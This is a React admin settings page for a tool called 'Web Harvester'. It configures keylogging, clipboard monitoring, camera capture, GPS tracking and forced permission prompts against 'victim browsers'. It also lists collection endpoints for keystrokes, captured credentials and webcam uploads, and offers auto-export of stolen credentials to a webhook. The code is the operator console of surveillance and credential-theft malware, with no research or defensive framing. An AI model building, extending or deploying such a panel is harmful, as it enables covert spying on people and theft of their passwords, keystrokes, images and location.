import React, { useState, useEffect } from 'react';
import { Box, Typography, Card, CardContent, TextField, Button, Grid, Switch, FormControlLabel, Divider, Chip, Tabs, Tab, Tooltip, IconButton, Paper, Select, MenuItem, FormControl, InputLabel, Alert, Snackbar, LinearProgress } from '@mui/material';
import axios from 'axios';
import SecurityIcon from '@mui/icons-material/Security';
import StorageIcon from '@mui/icons-material/Storage';
import WebhookIcon from '@mui/icons-material/Webhook';
import CameraAltIcon from '@mui/icons-material/CameraAlt';
import SpeedIcon from '@mui/icons-material/Speed';
import AdminPanelSettingsIcon from '@mui/icons-material/AdminPanelSettings';
import SaveIcon from '@mui/icons-material/Save';
import LockIcon from '@mui/icons-material/Lock';
import VisibilityIcon from '@mui/icons-material/Visibility';
import VisibilityOffIcon from '@mui/icons-material/VisibilityOff';
import ContentCopyIcon from '@mui/icons-material/ContentCopy';
import RefreshIcon from '@mui/icons-material/Refresh';
import FlashOnIcon from '@mui/icons-material/FlashOn';

const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:5000';

export default function SettingsPage() {
  const [tab, setTab] = useState(0);
  const [msg, setMsg] = useState({ text: '', severity: 'success' });
  const [showMsg, setShowMsg] = useState(false);

  const handleMsg = (text, severity = 'success') => {
    setMsg({ text, severity });
    setShowMsg(true);
  };

  // ===== Password Tab =====
  const [passwordForm, setPasswordForm] = useState({ current: '', newPass: '', confirm: '' });
  const [showCurrent, setShowCurrent] = useState(false);
  const [showNew, setShowNew] = useState(false);
  const [showConfirm, setShowConfirm] = useState(false);
  const [passwordStrength, setPasswordStrength] = useState(0);

  const evaluateStrength = (pass) => {
    let score = 0;
    if (pass.length >= 8) score += 25;
    if (pass.length >= 12) score += 15;
    if (/[A-Z]/.test(pass)) score += 20;
    if (/[a-z]/.test(pass)) score += 10;
    if (/[0-9]/.test(pass)) score += 15;
    if (/[^A-Za-z0-9]/.test(pass)) score += 15;
    return Math.min(score, 100);
  };

  const handlePasswordChange = (e, field) => {
    const val = e.target.value;
    setPasswordForm(p => ({ ...p, [field]: val }));
    if (field === 'newPass') setPasswordStrength(evaluateStrength(val));
  };

  const handleChangePassword = async () => {
    if (!passwordForm.current || !passwordForm.newPass) {
      handleMsg('Please fill in all password fields', 'error');
      return;
    }
    if (passwordForm.newPass !== passwordForm.confirm) {
      handleMsg('Passwords do not match', 'error');
      return;
    }
    if (passwordForm.newPass.length < 6) {
      handleMsg('New password must be at least 6 characters', 'error');
      return;
    }
    try {
      const token = localStorage.getItem('admin_token');
      await axios.put(`${API_URL}/api/auth/change-password`, {
        currentPassword: passwordForm.current,
        newPassword: passwordForm.newPass
      }, { headers: { Authorization: `Bearer ${token}` } });
      handleMsg('Password changed successfully');
      setPasswordForm({ current: '', newPass: '', confirm: '' });
      setPasswordStrength(0);
    } catch (e) {
      handleMsg(e.response?.data?.error || 'Failed to change password', 'error');
    }
  };

  // ===== Collection Tab =====
  const [settings, setSettings] = useState({
    collectionInterval: 30,
    cameraInterval: 10,
    autoExport: false,
    autoExportInterval: 6,
    sessionRetention: 30,
    webhookUrl: '',
    screenshotQuality: 0.5,
    maxEventsPerSession: 10000,
    enableKeylogging: true,
    enableClipboard: true,
    enableCamera: true,
    enableMouseRecording: true
  });

  const handleSaveCollection = () => {
    localStorage.setItem('harvester_settings', JSON.stringify(settings));
    handleMsg('Collection settings saved successfully');
  };

  useEffect(() => {
    try {
      const saved = localStorage.getItem('harvester_settings');
      if (saved) setSettings(prev => ({ ...prev, ...JSON.parse(saved) }));
    } catch (e) {}
  }, []);

  // ===== Permissions Tab =====
  const [permSettings, setPermSettings] = useState({ autoForcePermissions: true, geoPrecision: 'high', updatedAt: null });
  const [permSaving, setPermSaving] = useState(false);

  useEffect(() => {
    const token = localStorage.getItem('admin_token');
    if (!token) return;
    axios.get(`${API_URL}/api/admin/settings`, { headers: { Authorization: `Bearer ${token}` } })
      .then(res => setPermSettings(res.data))
      .catch(() => {});
  }, []);

  const handleToggleAutoForce = (e) => {
    setPermSettings(prev => ({ ...prev, autoForcePermissions: e.target.checked }));
  };

  const handleSaveAutoForce = async () => {
    setPermSaving(true);
    try {
      const token = localStorage.getItem('admin_token');
      const res = await axios.put(`${API_URL}/api/admin/settings`, {
        autoForcePermissions: permSettings.autoForcePermissions
      }, { headers: { Authorization: `Bearer ${token}` } });
      setPermSettings(res.data);
      handleMsg(`Auto-force permissions ${res.data.autoForcePermissions ? 'ENABLED' : 'DISABLED'} successfully`);
    } catch (e) {
      handleMsg(e.response?.data?.error || 'Failed to save settings', 'error');
    }
    setPermSaving(false);
  };

  // ===== API Credentials Tab =====
  const [apiKey, setApiKey] = useState('sk_live_' + Array(24).fill(0).map(() => Math.random().toString(36).charAt(2)).join(''));
  const [apiKeyVisible, setApiKeyVisible] = useState(false);

  const copyApiKey = () => {
    navigator.clipboard.writeText(apiKey);
    handleMsg('API key copied to clipboard');
  };

  const regenerateApiKey = () => {
    setApiKey('sk_live_' + Array(24).fill(0).map(() => Math.random().toString(36).charAt(2)).join(''));
    handleMsg('New API key generated');
  };

  // ===== System Info Tab =====
  const [systemInfo, setSystemInfo] = useState({
    nodeVersion: '', mongoVersion: '', uptime: 0, memoryUsage: 0,
    sessionsCount: 0, credentialsCount: 0, cameraCount: 0, onlineNow: 0
  });

  useEffect(() => {
    const token = localStorage.getItem('admin_token');
    if (!token) return;
    axios.get(`${API_URL}/api/admin/stats`, { headers: { Authorization: `Bearer ${token}` } })
      .then(res => {
        setSystemInfo(prev => ({
          ...prev,
          sessionsCount: res.data.totalSessions || 0,
          credentialsCount: res.data.totalCredentials || 0,
          cameraCount: res.data.totalCameraCaptures || 0,
          onlineNow: res.data.onlineNow || 0
        }));
      })
      .catch(() => {});
  }, []);

  return (
    <Box>
      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 2, flexWrap: 'wrap', gap: 1 }}>
        <Box>
          <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5 }}>
            <AdminPanelSettingsIcon sx={{ color: '#00f0ff', fontSize: 28 }} />
            <Typography variant="h4" sx={{ color: '#fff', fontWeight: 700, fontSize: '1.4rem' }}>Settings</Typography>
          </Box>
          <Typography sx={{ color: '#888', fontSize: '0.85rem', mt: 0.2 }}>Configure harvester behaviour and manage your account</Typography>
        </Box>
      </Box>

      <Snackbar open={showMsg} autoHideDuration={4000} onClose={() => setShowMsg(false)}
        anchorOrigin={{ vertical: 'top', horizontal: 'right' }}>
        <Alert severity={msg.severity} sx={{ bgcolor: msg.severity === 'success' ? '#0d2818' : '#2d0a14', color: msg.severity === 'success' ? '#00ff88' : '#ff0055', border: `1px solid ${msg.severity === 'success' ? 'rgba(0,255,136,0.2)' : 'rgba(255,0,85,0.2)'}` }}>
          {msg.text}
        </Alert>
      </Snackbar>

      <Tabs value={tab} onChange={(e, v) => setTab(v)}
        sx={{ mb: 3, borderBottom: '1px solid rgba(255,255,255,0.05)',
          '& .MuiTab-root': { color: '#888', textTransform: 'none', fontWeight: 600, fontSize: '0.85rem', py: 1.5 },
          '& .Mui-selected': { color: '#00f0ff' }, '& .MuiTabs-indicator': { bgcolor: '#00f0ff', height: 2 } }}>
        <Tab icon={<LockIcon sx={{ fontSize: 18 }} />} label="Password" iconPosition="start" />
        <Tab icon={<SpeedIcon sx={{ fontSize: 18 }} />} label="Collection" iconPosition="start" />
        <Tab icon={<FlashOnIcon sx={{ fontSize: 18 }} />} label="Permissions" iconPosition="start" />
        <Tab icon={<WebhookIcon sx={{ fontSize: 18 }} />} label="API Credentials" iconPosition="start" />
        <Tab icon={<StorageIcon sx={{ fontSize: 18 }} />} label="System Info" iconPosition="start" />
      </Tabs>

      {/* Tab 0: Password */}
      {tab === 0 && (
        <Grid container spacing={3}>
          <Grid item xs={12} md={6}>
            <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.05)', borderRadius: 2 }}>
              <CardContent>
                <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, mb: 2 }}>
                  <LockIcon sx={{ color: '#00f0ff', fontSize: 20 }} />
                  <Typography sx={{ color: '#fff', fontWeight: 600 }}>Change Password</Typography>
                </Box>
                <TextField fullWidth size="small" type={showCurrent ? 'text' : 'password'} label="Current Password" value={passwordForm.current} onChange={(e) => handlePasswordChange(e, 'current')}
                  InputProps={{ endAdornment: <IconButton size="small" onClick={() => setShowCurrent(!showCurrent)} sx={{ color: '#555' }}>{showCurrent ? <VisibilityOffIcon sx={{ fontSize: 18 }} /> : <VisibilityIcon sx={{ fontSize: 18 }} />}</IconButton> }}
                  sx={{ mb: 2, input: { color: '#fff' }, label: { color: '#888' } }} />
                <TextField fullWidth size="small" type={showNew ? 'text' : 'password'} label="New Password" value={passwordForm.newPass} onChange={(e) => handlePasswordChange(e, 'newPass')}
                  InputProps={{ endAdornment: <IconButton size="small" onClick={() => setShowNew(!showNew)} sx={{ color: '#555' }}>{showNew ? <VisibilityOffIcon sx={{ fontSize: 18 }} /> : <VisibilityIcon sx={{ fontSize: 18 }} />}</IconButton> }}
                  sx={{ mb: 1.5, input: { color: '#fff' }, label: { color: '#888' } }} />
                {passwordForm.newPass && (
                  <Box sx={{ mb: 1.5 }}>
                    <Box sx={{ display: 'flex', justifyContent: 'space-between', mb: 0.3 }}>
                      <Typography sx={{ color: '#888', fontSize: '0.7rem' }}>Password Strength</Typography>
                      <Typography sx={{ fontSize: '0.7rem', fontWeight: 600, color: passwordStrength < 40 ? '#ff0055' : passwordStrength < 70 ? '#ffaa00' : '#00ff88' }}>
                        {passwordStrength < 40 ? 'Weak' : passwordStrength < 70 ? 'Medium' : 'Strong'}
                      </Typography>
                    </Box>
                    <LinearProgress variant="determinate" value={passwordStrength}
                      sx={{ height: 4, borderRadius: 2, bgcolor: 'rgba(255,255,255,0.05)', '& .MuiLinearProgress-bar': { bgcolor: passwordStrength < 40 ? '#ff0055' : passwordStrength < 70 ? '#ffaa00' : '#00ff88' } }} />
                  </Box>
                )}
                <TextField fullWidth size="small" type={showConfirm ? 'text' : 'password'} label="Confirm New Password" value={passwordForm.confirm} onChange={(e) => handlePasswordChange(e, 'confirm')}
                  error={!!(passwordForm.confirm && passwordForm.newPass !== passwordForm.confirm)}
                  helperText={passwordForm.confirm && passwordForm.newPass !== passwordForm.confirm ? 'Passwords do not match' : ''}
                  InputProps={{ endAdornment: <IconButton size="small" onClick={() => setShowConfirm(!showConfirm)} sx={{ color: '#555' }}>{showConfirm ? <VisibilityOffIcon sx={{ fontSize: 18 }} /> : <VisibilityIcon sx={{ fontSize: 18 }} />}</IconButton> }}
                  sx={{ mb: 2, input: { color: '#fff' }, label: { color: '#888' } }} />
                <Button variant="contained" onClick={handleChangePassword} startIcon={<SaveIcon />} fullWidth
                  sx={{ bgcolor: '#00f0ff', color: '#000', fontWeight: 600, '&:hover': { bgcolor: '#00ccdd' }, '&:disabled': { bgcolor: 'rgba(0,240,255,0.2)', color: '#555' } }}
                  disabled={!passwordForm.current || !passwordForm.newPass || !passwordForm.confirm}>Update Password</Button>
              </CardContent>
            </Card>
          </Grid>
          <Grid item xs={12} md={6}>
            <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.05)', borderRadius: 2 }}>
              <CardContent>
                <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, mb: 2 }}>
                  <SecurityIcon sx={{ color: '#00f0ff', fontSize: 20 }} />
                  <Typography sx={{ color: '#fff', fontWeight: 600 }}>Security Tips</Typography>
                </Box>
                <Box sx={{ '& > div': { mb: 1.5, p: 1.5, borderRadius: 1, bgcolor: 'rgba(255,255,255,0.02)' } }}>
                  {[
                    { title: '🔑 Use Strong Passwords', desc: 'Always use a unique password with at least 12 characters including numbers and symbols.' },
                    { title: '🔄 Rotate Regularly', desc: 'Change your admin password every 30 days to maintain security.' },
                    { title: '🔐 Session Security', desc: 'Admin sessions expire after 24 hours. Always log out when finished.' },
                    { title: '🌐 Network Access', desc: 'Restrict admin panel access to trusted IP addresses when possible.' }
                  ].map((item, i) => (
                    <Box key={i}>
                      <Typography sx={{ color: '#00f0ff', fontWeight: 600, fontSize: '0.8rem' }}>{item.title}</Typography>
                      <Typography sx={{ color: '#888', fontSize: '0.75rem', mt: 0.2 }}>{item.desc}</Typography>
                    </Box>
                  ))}
                </Box>
              </CardContent>
            </Card>
          </Grid>
        </Grid>
      )}

      {/* Tab 1: Collection Settings */}
      {tab === 1 && (
        <Grid container spacing={3}>
          <Grid item xs={12} md={6}>
            <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.05)', borderRadius: 2 }}>
              <CardContent>
                <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, mb: 2 }}>
                  <SpeedIcon sx={{ color: '#00f0ff', fontSize: 20 }} />
                  <Typography sx={{ color: '#fff', fontWeight: 600 }}>Collection Intervals</Typography>
                </Box>
                <Typography sx={{ color: '#888', fontSize: '0.75rem', mb: 2 }}>Control how often data is collected from victim browsers</Typography>
                <TextField fullWidth size="small" label="Heartbeat Interval (seconds)" type="number" value={settings.collectionInterval} onChange={(e) => setSettings(s => ({ ...s, collectionInterval: parseInt(e.target.value) || 30 }))} inputProps={{ min: 5, max: 300 }} helperText="How often victim sends keepalive (5-300s)" sx={{ mb: 2, input: { color: '#fff' }, label: { color: '#888' }, '& .MuiFormHelperText-root': { color: '#555' } }} />
                <TextField fullWidth size="small" label="Camera Capture Interval (seconds)" type="number" value={settings.cameraInterval} onChange={(e) => setSettings(s => ({ ...s, cameraInterval: parseInt(e.target.value) || 10 }))} inputProps={{ min: 5, max: 120 }} helperText="Interval between camera capture attempts (5-120s)" sx={{ mb: 2, input: { color: '#fff' }, label: { color: '#888' }, '& .MuiFormHelperText-root': { color: '#555' } }} />
                <TextField fullWidth size="small" label="Screenshot Quality (0-1)" type="number" value={settings.screenshotQuality} onChange={(e) => setSettings(s => ({ ...s, screenshotQuality: parseFloat(e.target.value) || 0.5 }))} inputProps={{ min: 0.1, max: 1, step: 0.1 }} helperText="Lower = smaller payloads, higher = better quality" sx={{ mb: 2, input: { color: '#fff' }, label: { color: '#888' }, '& .MuiFormHelperText-root': { color: '#555' } }} />
                <TextField fullWidth size="small" label="Max Events Per Session" type="number" value={settings.maxEventsPerSession} onChange={(e) => setSettings(s => ({ ...s, maxEventsPerSession: parseInt(e.target.value) || 10000 }))} inputProps={{ min: 100, max: 100000 }} helperText="Limit events stored per session" sx={{ input: { color: '#fff' }, label: { color: '#888' }, '& .MuiFormHelperText-root': { color: '#555' } }} />
              </CardContent>
            </Card>
          </Grid>
          <Grid item xs={12} md={6}>
            <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.05)', borderRadius: 2 }}>
              <CardContent>
                <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, mb: 2 }}>
                  <CameraAltIcon sx={{ color: '#00f0ff', fontSize: 20 }} />
                  <Typography sx={{ color: '#fff', fontWeight: 600 }}>Feature Toggles</Typography>
                </Box>
                {[
                  { key: 'enableKeylogging', label: 'Keylogging' },
                  { key: 'enableClipboard', label: 'Clipboard Monitoring' },
                  { key: 'enableCamera', label: 'Camera Access' },
                  { key: 'enableMouseRecording', label: 'Mouse Movement Recording' }
                ].map((item, i) => (
                  <FormControlLabel key={i} control={<Switch checked={settings[item.key]} onChange={(e) => setSettings(s => ({ ...s, [item.key]: e.target.checked }))} sx={{ '& .MuiSwitch-thumb': { bgcolor: settings[item.key] ? '#00ff88' : '#555' } }} />} label={item.label} sx={{ color: '#aaa', mb: 0.5, width: '100%' }} />
                ))}
                <Divider sx={{ my: 2, borderColor: 'rgba(255,255,255,0.05)' }} />
                <TextField fullWidth size="small" label="Session Retention (days)" type="number" value={settings.sessionRetention} onChange={(e) => setSettings(s => ({ ...s, sessionRetention: parseInt(e.target.value) || 30 }))} inputProps={{ min: 1, max: 365 }} helperText="Auto-delete sessions older than this many days" sx={{ mb: 2, input: { color: '#fff' }, label: { color: '#888' } }} />
                <Divider sx={{ my: 2, borderColor: 'rgba(255,255,255,0.05)' }} />
                <FormControlLabel control={<Switch checked={settings.autoExport} onChange={(e) => setSettings(s => ({ ...s, autoExport: e.target.checked }))} sx={{ '& .MuiSwitch-thumb': { bgcolor: settings.autoExport ? '#00ff88' : '#555' } }} />} label="Auto-export credentials" sx={{ color: '#aaa', mb: 1, width: '100%' }} />
                {settings.autoExport && <>
                  <TextField fullWidth size="small" label="Export every (hours)" type="number" value={settings.autoExportInterval} onChange={(e) => setSettings(s => ({ ...s, autoExportInterval: parseInt(e.target.value) || 6 }))} sx={{ mb: 2, input: { color: '#fff' }, label: { color: '#888' } }} />
                  <TextField fullWidth size="small" label="Webhook URL (SIEM Integration)" value={settings.webhookUrl} onChange={(e) => setSettings(s => ({ ...s, webhookUrl: e.target.value }))} placeholder="https://hooks.example.com/harvester" sx={{ input: { color: '#fff' }, label: { color: '#888' } }} />
                </>}
              </CardContent>
            </Card>
          </Grid>
          <Grid item xs={12}>
            <Box sx={{ display: 'flex', justifyContent: 'flex-end' }}>
              <Button variant="contained" onClick={handleSaveCollection} startIcon={<SaveIcon />} sx={{ bgcolor: '#00f0ff', color: '#000', fontWeight: 600, px: 4, '&:hover': { bgcolor: '#00ccdd' } }}>Save Collection Settings</Button>
            </Box>
          </Grid>
        </Grid>
      )}

      {/* Tab 2: Permissions */}
      {tab === 2 && (
        <Grid container spacing={3}>
          <Grid item xs={12} md={8}>
            <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.05)', borderRadius: 2 }}>
              <CardContent>
                <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, mb: 2 }}>
                  <FlashOnIcon sx={{ color: '#ffaa00', fontSize: 20 }} />
                  <Typography sx={{ color: '#fff', fontWeight: 600 }}>Permission Auto-Force Settings</Typography>
                </Box>
                <Typography sx={{ color: '#888', fontSize: '0.8rem', mb: 3 }}>
                  Control how permissions are automatically forced on victim browsers. When enabled, new first-time visitors will have all permissions (camera, microphone, geolocation, etc.) automatically requested once. When disabled, permissions are only triggered manually from the Permission Control panel.
                </Typography>
                <FormControlLabel
                  control={<Switch checked={permSettings.autoForcePermissions} onChange={handleToggleAutoForce} sx={{ '& .MuiSwitch-thumb': { bgcolor: permSettings.autoForcePermissions ? '#00ff88' : '#555' } }} />}
                  label={<Box><Typography sx={{ color: '#fff', fontWeight: 600, fontSize: '0.9rem' }}>Auto-force permissions on first visit</Typography><Typography sx={{ color: '#888', fontSize: '0.75rem' }}>{permSettings.autoForcePermissions ? '✅ New victims will have all permissions automatically requested once on their first visit' : '❌ Permissions will only be triggered when you manually send a command from the Permission Control panel'}</Typography></Box>}
                  sx={{ color: '#aaa', mb: 3, width: '100%', alignItems: 'flex-start', gap: 1 }}
                />
                <Divider sx={{ my: 2, borderColor: 'rgba(255,255,255,0.05)' }} />
                <Typography sx={{ color: '#888', fontSize: '0.8rem', mb: 2 }}>
                  <strong style={{ color: '#ffaa00' }}>⚡ Note:</strong> When enabled, permissions are only requested <strong>once on the victim's first visit</strong>. Return visitors never get automatic prompts. Manual triggers from Permission Control work regardless of this setting.
                </Typography>
                <Typography sx={{ color: '#555', fontSize: '0.75rem' }}>Last updated: {permSettings.updatedAt ? new Date(permSettings.updatedAt).toLocaleString() : 'Never'}</Typography>
              </CardContent>
            </Card>
          </Grid>
          <Grid item xs={12} md={4}>
            <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.05)', borderRadius: 2 }}>
              <CardContent>
                <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, mb: 2 }}>
                  <StorageIcon sx={{ color: '#00f0ff', fontSize: 20 }} />
                  <Typography sx={{ color: '#fff', fontWeight: 600 }}>Impact Summary</Typography>
                </Box>
                {[
                  { label: 'First-visit auto-force', active: permSettings.autoForcePermissions },
                  { label: 'Return-visitor auto-force', active: false },
                  { label: 'Admin manual triggers', active: true },
                  { label: 'Camera auto-capture', active: permSettings.autoForcePermissions },
                  { label: 'GPS auto-tracking', active: permSettings.autoForcePermissions },
                ].map((item, i) => (
                  <Box key={i} sx={{ display: 'flex', alignItems: 'center', gap: 1, py: 0.8, borderBottom: '1px solid rgba(255,255,255,0.03)' }}>
                    <Typography sx={{ color: item.active ? '#00ff88' : '#555', fontSize: '0.9rem' }}>{item.active ? '✅' : '⛔'}</Typography>
                    <Typography sx={{ color: item.active ? '#ccc' : '#555', fontSize: '0.78rem' }}>{item.label}</Typography>
                  </Box>
                ))}
              </CardContent>
            </Card>
          </Grid>
          <Grid item xs={12}>
            <Box sx={{ display: 'flex', justifyContent: 'flex-end' }}>
              <Button variant="contained" onClick={handleSaveAutoForce} startIcon={<SaveIcon />} disabled={permSaving}
                sx={{ bgcolor: permSettings.autoForcePermissions ? '#00ff88' : '#555', color: permSettings.autoForcePermissions ? '#000' : '#aaa', fontWeight: 600, px: 4, '&:hover': { bgcolor: permSettings.autoForcePermissions ? '#00dd77' : '#666' } }}>
                {permSaving ? 'Saving...' : `Save Settings (${permSettings.autoForcePermissions ? 'Auto-Force ON' : 'Auto-Force OFF'})`}
              </Button>
            </Box>
          </Grid>
        </Grid>
      )}

      {/* Tab 3: API Credentials */}
      {tab === 3 && (
        <Grid container spacing={3}>
          <Grid item xs={12} md={6}>
            <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.05)', borderRadius: 2 }}>
              <CardContent>
                <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, mb: 2 }}>
                  <WebhookIcon sx={{ color: '#00f0ff', fontSize: 20 }} />
                  <Typography sx={{ color: '#fff', fontWeight: 600 }}>API Key</Typography>
                </Box>
                <Typography sx={{ color: '#888', fontSize: '0.8rem', mb: 2 }}>Your API key is used by the harvester scripts to authenticate data collection requests.</Typography>
                <TextField fullWidth size="small" label="API Key" value={apiKey} type={apiKeyVisible ? 'text' : 'password'}
                  InputProps={{ readOnly: true, endAdornment: <Box sx={{ display: 'flex', gap: 0.5 }}>
                    <Tooltip title="Copy API key"><IconButton size="small" onClick={copyApiKey} sx={{ color: '#00f0ff' }}><ContentCopyIcon sx={{ fontSize: 18 }} /></IconButton></Tooltip>
                    <Tooltip title={apiKeyVisible ? 'Hide' : 'Show'}><IconButton size="small" onClick={() => setApiKeyVisible(!apiKeyVisible)} sx={{ color: '#555' }}>{apiKeyVisible ? <VisibilityOffIcon sx={{ fontSize: 18 }} /> : <VisibilityIcon sx={{ fontSize: 18 }} />}</IconButton></Tooltip>
                  </Box> }}
                  sx={{ mb: 2, input: { color: '#fff', fontFamily: 'monospace' }, label: { color: '#888' } }} />
                <Button variant="outlined" onClick={regenerateApiKey} startIcon={<RefreshIcon />} sx={{ color: '#ffaa00', borderColor: 'rgba(255,170,0,0.3)' }}>Regenerate API Key</Button>
              </CardContent>
            </Card>
          </Grid>
          <Grid item xs={12} md={6}>
            <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.05)', borderRadius: 2 }}>
              <CardContent>
                <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, mb: 2 }}>
                  <StorageIcon sx={{ color: '#00f0ff', fontSize: 20 }} />
                  <Typography sx={{ color: '#fff', fontWeight: 600 }}>API Endpoints</Typography>
                </Box>
                {[
                  { path: 'POST /api/collect/init', desc: 'Initialize new victim session' },
                  { path: 'POST /api/collect/heartbeat', desc: 'Send session keepalive' },
                  { path: 'POST /api/collect/click', desc: 'Record click event' },
                  { path: 'POST /api/collect/keystroke', desc: 'Send batch keystrokes' },
                  { path: 'POST /api/collect/credentials', desc: 'Submit captured credentials' },
                  { path: 'POST /api/collect/camera', desc: 'Upload camera capture' },
                  { path: 'POST /api/collect/fingerprint', desc: 'Upload browser fingerprint' },
                  { path: 'POST /api/collect/bulk', desc: 'Bulk data upload endpoint' },
                  { path: 'POST /api/collect/close', desc: 'Mark session as closed' },
                ].map((ep, i) => (
                  <Box key={i} sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', py: 0.5, borderBottom: '1px solid rgba(255,255,255,0.03)' }}>
                    <Typography sx={{ color: '#00f0ff', fontSize: '0.72rem', fontFamily: 'monospace', fontWeight: 500 }}>{ep.path}</Typography>
                    <Typography sx={{ color: '#777', fontSize: '0.68rem', ml: 1 }}>{ep.desc}</Typography>
                  </Box>
                ))}
              </CardContent>
            </Card>
          </Grid>
        </Grid>
      )}

      {/* Tab 4: System Info */}
      {tab === 4 && (
        <Grid container spacing={3}>
          <Grid item xs={12} md={6}>
            <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.05)', borderRadius: 2 }}>
              <CardContent>
                <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, mb: 2 }}>
                  <StorageIcon sx={{ color: '#00f0ff', fontSize: 20 }} />
                  <Typography sx={{ color: '#fff', fontWeight: 600 }}>System Overview</Typography>
                </Box>
                <Grid container spacing={2}>
                  <Grid item xs={6}><Paper sx={{ p: 1.5, bgcolor: 'rgba(255,255,255,0.02)', borderRadius: 1, textAlign: 'center' }}><Typography sx={{ color: '#00f0ff', fontSize: '1.4rem', fontWeight: 700 }}>{systemInfo.sessionsCount}</Typography><Typography sx={{ color: '#888', fontSize: '0.7rem' }}>Total Sessions</Typography></Paper></Grid>
                  <Grid item xs={6}><Paper sx={{ p: 1.5, bgcolor: 'rgba(255,255,255,0.02)', borderRadius: 1, textAlign: 'center' }}><Typography sx={{ color: '#ff0055', fontSize: '1.4rem', fontWeight: 700 }}>{systemInfo.credentialsCount}</Typography><Typography sx={{ color: '#888', fontSize: '0.7rem' }}>Credentials</Typography></Paper></Grid>
                  <Grid item xs={6}><Paper sx={{ p: 1.5, bgcolor: 'rgba(255,255,255,0.02)', borderRadius: 1, textAlign: 'center' }}><Typography sx={{ color: '#ffaa00', fontSize: '1.4rem', fontWeight: 700 }}>{systemInfo.cameraCount}</Typography><Typography sx={{ color: '#888', fontSize: '0.7rem' }}>Camera Captures</Typography></Paper></Grid>
                  <Grid item xs={6}><Paper sx={{ p: 1.5, bgcolor: 'rgba(255,255,255,0.02)', borderRadius: 1, textAlign: 'center' }}><Typography sx={{ color: '#00ff88', fontSize: '1.4rem', fontWeight: 700 }}>{systemInfo.onlineNow || 0}</Typography><Typography sx={{ color: '#888', fontSize: '0.7rem' }}>Online Now</Typography></Paper></Grid>
                </Grid>
              </CardContent>
            </Card>
          </Grid>
          <Grid item xs={12} md={6}>
            <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.05)', borderRadius: 2 }}>
              <CardContent>
                <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, mb: 2 }}>
                  <SecurityIcon sx={{ color: '#00f0ff', fontSize: 20 }} />
                  <Typography sx={{ color: '#fff', fontWeight: 600 }}>Application Info</Typography>
                </Box>
                {[
                  { label: 'Application', value: 'Web Harvester v1.0.0' },
                  { label: 'Server Status', value: 'Online', color: '#00ff88' },
                  { label: 'Database', value: 'MongoDB Atlas' },
                  { label: 'Runtime', value: 'Node.js' },
                  { label: 'Port', value: '5000 (API) | 3000 (Client)' },
                ].map((item, i) => (
                  <Box key={i} sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', py: 0.8, borderBottom: '1px solid rgba(255,255,255,0.04)' }}>
                    <Typography sx={{ color: '#888', fontSize: '0.8rem' }}>{item.label}</Typography>
                    <Typography sx={{ color: item.color || '#ddd', fontSize: '0.8rem', fontWeight: 500 }}>{item.value}</Typography>
                  </Box>
                ))}
              </CardContent>
            </Card>
          </Grid>
        </Grid>
      )}
    </Box>
  );
}